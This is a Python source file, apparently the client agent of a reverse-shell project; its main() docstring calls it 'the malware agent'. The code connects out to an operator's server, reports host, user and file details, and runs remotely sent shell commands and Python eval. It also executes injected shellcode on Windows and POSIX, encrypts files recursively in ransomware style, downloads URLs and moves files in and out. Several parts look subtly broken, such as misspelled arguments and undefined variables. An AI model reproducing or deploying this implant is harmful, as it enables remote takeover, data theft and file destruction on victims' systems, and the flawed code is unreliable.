#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implements an advanced reverse shell console.
#    Copyright (C) 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).

~# python -m ReverseShell.clients.shellclienthttpsencrypt_advanced_1_0_0 127.0.0.1 yes no no HTTP abcd no 1337 yes yes ""
~# 
"""

__version__ = "0.1.0"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/ReverseShell"

copyright = """
ReverseShell  Copyright (C) 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = []

print(copyright)

from glob import iglob
from json import dumps
from shlex import split
from io import StringIO
from getpass import getuser
from zipfile import ZipFile
from threading import Thread
from functools import partial
from contextlib import suppress
from subprocess import run, PIPE
from platform import node, system
from urllib.parse import urlparse
from urllib.request import urlopen
from tarfile import open as taropen
from typing import Dict, Union, List
from collections.abc import Callable
from gzip import compress, decompress
from base64 import b85decode, b85encode
from os.path import exists, basename, isfile
from sys import argv, stderr, exit, executable
from multiprocessing import Process, active_children
from contextlib import redirect_stderr, redirect_stdout
from os import getcwd, environ, listdir, name, urandom, chdir
from socket import socket, SOCK_DGRAM, SOCK_STREAM, AF_INET, AF_INET6
from ssl import _create_unverified_context, SSLContext, PROTOCOL_TLS_CLIENT
from ctypes import (
    cdll,
    c_bool,
    c_byte,
    c_char,
    c_char_p,
    c_double,
    c_float,
    c_long,
    c_longlong,
    c_short,
    c_ubyte,
    c_ulong,
    c_ulonglong,
    c_ushort,
    c_void_p,
    c_wchar,
    c_wchar_p,
)

from ..protocols import *
from ..tcp.utils import receiveall, sendall
from ..encryption.rc4 import encrypt, initialization, update_key

c_types = {
    "bool": c_bool,
    "byte": c_byte,
    "char": c_char,
    "char *": c_char_p,
    "double": c_double,
    "float": c_float,
    "long": c_long,
    "long long": c_longlong,
    "short": c_short,
    "unsigned byte": c_ubyte,
    "unsigned long": c_ulong,
    "unsigned long long": c_ulonglong,
    "unsigned short": c_ushort,
    "void *": c_void_p,
    "wchar": c_wchar,
    "wchar *": c_wchar_p,
}


class Command:
    """
    This class implements a command behaviour
    and detection.
    """

    instances = []

    def __init__(self, startswith: str, execute: Callable):
        self.startswith = startswith
        self.execute = execute
        self.instances.append(self)


def upload_file(command: str, compress: bool = False) -> bytes:
    """
    This function uploads file from builtins command "upload_file".
    """

    _, filename, content = split(command)
    content = b85decode(content.encode())
    if compress:
        content = decompress(content)

    with open(filename, "wb") as file:
        file.write(content)

    return b"done"


def download_file(command: str, compress: bool = False) -> bytes:
    """
    This function downloads file from builtins command "download_file".
    """

    with open(command[23 if compress else 14 :], "rb") as file:
        content = file.read()

    return b85encode(compress(content) if compress else content)


def encrypt_files(
    key: str, *paths: str, decrypt: bool = False
) -> None:
    """
    This function creates processes to encrypts multiples files.
    """

    for path in paths:
        for filepath in iglob(path, recusive=True):
            process = (Thread if Command.use_thread else Process)(
                target=encrypt_file,
                args=(key, filepath, decrypt),
                name=("decrypt" if decrypt else "encrypt")
                + "_file "
                + repr(filepath),
            )
            process.start()


def encrypt_file(key_: str, path: str, decrypt: bool = False) -> None:
    """
    This function encrypts a file.
    """

    key = initialization(key_.encode())
    with open(path, "rb+") as file:
        data = encrypt(key, file.read(), decrypt)
        file.seek(0)
        file.write(data)
        file.truncate()


def make_tar_archive(
    indexed_extensions: Dict[Union[int, str], Union[int, str]],
    index: int,
    name: str,
    *paths: str,
) -> None:
    """
    This function creates a TAR archive from local files.
    """

    with taropen(
        name, "w:" + indexed_extensions.get(index + 1, "")
    ) as tarfile:
        tuple(
            tarfile.add(filepath)
            for path in paths
            for filepath in iglob(path, recusive=True)
        )


def make_zip_archive(
    indexed_extensions: Dict[Union[int, str], Union[int, str]],
    index: int,
    name: str,
    *paths: str,
) -> None:
    """
    This function creates a ZIP archive from local files.
    """

    with ZipFile(name, "w") as zipfile:
        tuple(
            zipfile.write(filepath)
            for path in paths
            for filepath in iglob(path, recusive=True)
        )


def archive_files(name: str, *paths: str) -> bytes:
    """
    This function creates an archive from local files.
    """

    indexed_extensions = {
        x if x == "tar" else i: i if x == "tar" else x
        for i, x in enumerate(name.split("."))
    }
    if index := indexed_extensions.get("tar"):
        make_archive = make_tar_archive
    elif name.endswith(".zip"):
        make_archive = make_zip_archive
    else:
        return b'Filename error, extension must be ".zip", ".tar.gz", ".tar.bz2", ".tar.xz" or ".tar"'

    process = (Thread if Command.use_thread else Process)(
        target=make_archive, args=(name, *paths), name="archive_files " + name
    )
    process.start()
    return b"Making archive..."


def call_library_function(library: str, function: str, *params: str) -> bytes:
    """
    This function calls a function in native library.
    """

    function = getattr(cdll.LoadLibrary(library), function)
    params_ = []
    for param in params:
        typename, _, value = param.partition(":")
        if typename == "bool":
            value = value.casefold() in ("true", "1", "on")
        elif typename in (
            "byte",
            "long",
            "long long",
            "short",
            "unsigned byte",
            "unsigned long",
            "unsigned long long",
            "unsigned short",
            "void *",
        ):
            value = int(value)
        elif typename == "char":
            value = int(value) if len(value) != 1 else value.encode("latin-1")
        elif typename == "char *":
            value = value.encode()
        elif typename == "double" or typename == "float":
            value = float(value)
        # String value for "wchar", "wchar *"
        params_.append(c_types[typename](value))
    function.restype = c_void_p
    value = function(*params_)
    return b"Return value: " + str(value).encode("ascii")


def download_from_url(url: str, filename: str = None) -> bytes:
    """
    This function downloads a local file from URL.
    """

    try:
        response = urlopen(url)
    except Exception as e:
        return f"{e.__class__.__name__}: {e}".encode()
    if not filename:
        filename = basename(urlparse(url).path) or "download.txt"
    with open(filename, "wb") as file:
        file.write(response.read())
    return b"Done"


def get_executables() -> List[str]:
    """
    This function returns files in PATH.
    """

    return [
        file
        for directory in environ["PATH"].split(":" if name != "nt" else ";")
        if exists(directory)
        for file in listdir(directory)
    ]


def posix_shellcode(shellcode: bytes) -> bytes:
    """
    This function runs shellcode on POSIX systems.
    """

    from mmap import (
        mmap,
        PAGESIZE,
        MAP_SHARED,
        PROT_READ,
        PROT_WRITE,
        PROT_EXEC,
    )
    from ctypes import string_at, CFUNCTYPE, c_void_p

    memory = mmap(
        -1,
        PAGESIZE,
        MAP_SHARED,
        PROT_READ | PROT_WRITE | PROT_EXEC,
    )
    memory.write(shellcode)
    address = int.from_bytes(string_at(id(memory) + 16, 8), "little")
    function_type = CFUNCTYPE(c_void_p)
    shellcode_function = function_type(address)
    stdout = StringIO()
    stderr = StringIO()
    with redirect_stdout(stdout), redirect_stderr(stderr):
        shellcode_function()
    return (stdout.getvalue() + stderr.getvalue()).encode() or b" "


def nt_shellcode(shellcode: bytes) -> bytes:
    """
    This function runs shellcode on Windows systems.
    """

    from ctypes import (
        c_ulonglong,
        pointer as get_pointer,
        c_char,
        c_void_p,
        windll,
    )

    kernel32 = windll.kernel32
    shellcode_length = len(shellcode)
    shellcode = bytearray(shellcode)
    kernel32.VirtualAlloc.restype = c_void_p
    pointer = kernel32.VirtualAlloc(
        c_ulonglong(0),
        c_ulonglong(shellcode_length),
        c_ulonglong(0x3000),
        c_ulonglong(0x40),
    )
    buffer = (c_char * shellcode_length).from_buffer(shellcode)
    kernel32.RtlMoveMemory(
        c_ulonglong(pointer), buffer, c_ulonglong(shellcode_length)
    )
    stdout = StringIO()
    stderr = StringIO()
    with redirect_stdout(stdout), redirect_stderr(stderr):
        thread = kernel32.CreateThread(
            c_ulonglong(0),
            c_ulonglong(0),
            c_ulonglong(pointer),
            c_ulonglong(0),
            c_ulonglong(0),
            get_pointer(c_ulonglong(0)),
        )
    kernel32.WaitForSingleObject(c_ulonglong(thread), c_ulonglong(-1))
    return (stdout.getvalue() + stderr.getvalue()).encode() or b" "


def python_exec(code: str) -> bytes:
    """
    This function executes python code sent by
    server and returns stdout and stderr.
    """

    stdout = StringIO()
    stderr = StringIO()
    with redirect_stdout(stdout), redirect_stderr(stderr):
        stdout.write(str(eval(code)))
    return (stdout.getvalue() + stderr.getvalue()).encode() or b" "


def command_encrypt_file(command: str, decrypt: bool = False) -> bytes:
    """
    This function starts a file to encrypt a file.
    """

    _, encryption_key, file = split(command)
    process = (Thread if Command.use_thread else Process)(
        target=encrypt_file,
        args=(encryption_key, file, decrypt),
        name=("decrypt_file " if decrypt else "encrypt_file ") + repr(file),
    )
    process.start()
    return (b"Decryption" if decrypt else b"Encryption") + b" is running..."


Command(
    "cd ",
    (lambda c: chdir(c[3:]) or send_environnement(False) or b"done"),
)
Command(
    "update_environment",
    (lambda c: send_environnement(False) or b"done"),
)
Command("upload_file ", upload_file)
Command("upload_file_compress ", partial(upload_file, compress=True))
Command("download_file ", download_file)
Command("download_file_compress ", partial(download_file, compress=True))
Command("python3_exec ", lambda c: python_exec(c[13:]))
Command(
    "python3_exec_compress ",
    lambda c: python_exec(decompress(b85decode(c[22:]))),
)
Command(
    "shellcode ",
    lambda c: globals()[name + "_shellcode"](b85decode(c[10:])),
)
Command(
    "shellcode_compress ",
    lambda c: globals()[name + "_shellcode"](
        decompress(b85decode(command[19:]))
    ),
)
Command("encrypt_file ", command_encrypt_file)
Command(
    "encrypt_files ",
    lambda c: encrypt_files(*split(c)[1:]) or b"Encryption is running...",
)
Command("decrypt_file ", partial(command_encrypt_file, decrypt=True))
Command(
    "decrypt_files ",
    lambda c: (
        encrypt_files(*split(command)[1:], decrypt=True)
        or b"Decryption is running..."
    ),
)
Command("download_url ", lambda c: download_from_url(*split(c)[1:]))
Command("archive_files ", lambda c: archive_files(*split(c)[1:]))
Command(
    "call_library_function ",
    lambda c: call_library_function(*split(c)[1:]),
)


def command(data: bytes) -> bytes:
    """
    This function receives and executes commands and sends outputs.
    """

    locals().update(variables)

    client = socket(socket_family, socket_protocol)
    client.connect((server, destination_port))
    client_ssl = context.wrap_socket(client)
    sendall(
        client_ssl,
        applicative_protocol.wrap_request(rc4(data)),
    )
    command = rc4(
        applicative_protocol.parse_response(
            receiveall(client_ssl, use_timeout)
        ), True
    ).decode()
    for command_instance in Command.instances:
        if command.strip().startswith(command_instance.startswith):
            data = command_instance.execute(command)
            break
    else:
        p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
        data = (p.stdout + p.stderr) or b" "
        client_ssl.close()
        client.close()
    childs = len(active_children())
    if childs:
        data += (
            b"\n\x1b[34m[*] "
            + str(childs).encode("ascii")
            + b" childs process are running..."
        )
    return data


def send_environnement(variables: Dict[str, Union[bool, int, str, SSLContext]], all: bool = True) -> None:
    """
    This function sends environment variables.
    """

    key_temp = None
    recevied = b""
    locals().update(variables)

    while recevied != b"\6":
        client = socket(socket_family, socket_protocol)
        client.connect((server, destination_port))
        data = rc4(
            b"\1"
            + (
                dumps(
                    {
                        "hostname": node(),
                        "user": getuser(),
                        "cwd": getcwd(),
                        "executables": get_executables()
                        + [
                            "cd",
                            "update_environment",
                            "upload_file",
                            "download_file",
                            "download_url",
                            "python3_exec",
                            "upload_file_compress",
                            "download_file_compress",
                            "python3_exec_compress",
                            "shellcode",
                            "shellcode_compress",
                            "encrypt_file",
                            "encrypt_files",
                            "decrypt_file",
                            "decrypt_files",
                            "archive_files",
                            "call_library_function",
                        ],
                        "files": listdir(),
                        "system": system(),
                        "encoding": "base85",
                        "commpression": "gzip",
                        "key": b85encode(
                            compress(key_temp := urandom(256))
                        ).decode(),
                    }
                ).encode()
                if all
                else dumps(
                    {
                        "files": listdir(),
                        "cwd": getcwd(),
                    }
                ).encode()
            )
        )
        client = context.wrap_socket(client)
        sendall(
            client,
            applicative_protocol.wrap_request(data),
        )
        recevied = rc4(
            applicative_protocol.parse_response(
                receiveall(client, use_timeout)
            ),
            True,
        )
        client.close()

    if key_temp:
        encryption_key = variables["encryption_key"] = update_key(
            encryption_key, key_temp
        )
        variables["rc4"] = partial(encrypt, encryption_key)


def get_args_string(namespace: Dict[str, str]) -> int:
    """
    This function gets strings variables from arguments
    and enviroments variables.
    """

    variables = {
        "server": "RS_SERVER",
        "use_ssl": "RS_USE_SSL",
        "use_udp": "RS_USE_UDP",
        "use_ipv6": "RS_USE_IPV6",
        "protocol": "RS_PROTOCOL",
        "encryption_key": "RS_KEY",
        "use_thread": "RS_USE_THREAD",
        "destination_port": "RS_PORT",
        "use_timeout": "RS_USE_TIMEOUT",
        # "socket_family": "RS_SOCKET_FAMILY",
        "unverified_ssl": "RS_UNVERIFIED_SSL",
        # "socket_protocol": "RS_SOCKET_PROTOCOL",
        # "applicative_protocol": "RS_APP_PROTOCOL",
        "ssl_certificate_file": "RS_SSL_CERTIFICATE_FILE",
    }

    for variable_name, environment_variable in variables.items():
        envvar = namespace[variable_name] = environ.get(environment_variable)
        if envvar is None and len(argv) > 1:
            envvar = namespace[variable_name] = argv[1]
            del argv[1]
            continue
        if envvar is None:
            print(
                f'USAGES: "{executable}" "{argv[0]}" {" ".join(variables)}',
                file=stderr,
            )
            print(
                "\t Or you can use environment variables to instead"
                " of arguments:",
                ", ".join(repr(x) for x in variables.values()),
                file=stderr,
            )
            return 1

    return 0


def parse_args(variables: Dict[str, str]) -> int:
    """
    This function parses, formats and types arguments.
    """

    encryption_key = variables["encryption_key"] = initialization(
        variables["encryption_key"].encode()
    )
    variables["rc4"] = partial(encrypt, encryption_key)
    use_ssl = variables["use_ssl"] = variables["use_ssl"].casefold() in (
        "1",
        "on",
        "true",
        "yes",
        "y",
        "t",
    )
    use_udp = variables["use_udp"] = variables["use_udp"].casefold() in (
        "1",
        "on",
        "true",
        "yes",
        "y",
        "t",
    )
    variables["socket_protocol"] = SOCK_DGRAM if use_udp else SOCK_STREAM
    use_ipv6 = variables["use_ipv6"] = variables["use_ipv6"].casefold() in (
        "1",
        "on",
        "true",
        "yes",
        "y",
        "t",
    )
    variables["socket_family"] = AF_INET6 if use_ipv6 else AF_INET
    Command.use_thread = variables["use_thread"] = variables["use_thread"].casefold() in (
        "1",
        "on",
        "true",
        "yes",
        "y",
        "t",
    )
    variables["use_timeout"] = variables["use_timeout"].casefold() in (
        "1",
        "on",
        "true",
        "yes",
        "y",
        "t",
    )
    unverified_ssl = variables["unverified_ssl"] = variables[
        "unverified_ssl"
    ].casefold() in ("1", "on", "true", "yes", "y", "t")

    protocol = variables["protocol"] = variables["protocol"].upper()
    if protocol not in protocols:
        print(
            "Protocol should be in",
            protocols,
            "not",
            repr(protocol),
            file=stderr,
        )
        return 2

    variables["applicative_protocol"] = globals()[protocol]

    destination_port = variables["destination_port"]
    if not destination_port.isdigit():
        print(
            "Destination port should be a port number (0-65535) not",
            repr(destination_port),
            file=stderr,
        )
        return 3

    variables["destination_port"] = destination_port = int(destination_port)
    if not 0 < destination_port < 65535:
        print(
            "Destination port should be a port number (0-65535) not",
            repr(destination_port),
            file=stderr,
        )
        return 4

    ssl_certificate_file = variables["ssl_certificate_file"]
    if ssl_certificate_file and not isfile(ssl_certificate_file):
        print(
            "Certificate file should be a real filename not",
            repr(ssl_certificate_file),
            file=stderr,
        )
        return 5

    if use_ssl and unverified_ssl:
        variables["context"] = _create_unverified_context()
    elif use_ssl and ssl_certificate_file:
        variables["context"] = SSLContext(PROTOCOL_TLS_CLIENT)
        context.load_verify_locations(ssl_certificate_file)
    elif use_ssl:
        variables["context"] = SSLContext(PROTOCOL_TLS_CLIENT)
    else:
        variables["context"] = None

    return 0


def main() -> int:
    """
    The main function to starts the malware agent.
    """

    variables = {}
    code = get_args_string(variables)
    if code:
        return code

    code = parse_args(variables)
    if code:
        return code

    locals().update(variables)

    data = b" "
    while True:
        with suppress(Exception):
            send_environnement()
            while True:
                try:
                    data = command(data)
                except Exception as e:
                    data = f"{e.__class__.__name__}: {e}".encode()
                    raise e


if __name__ == "__main__":
    exit(main())
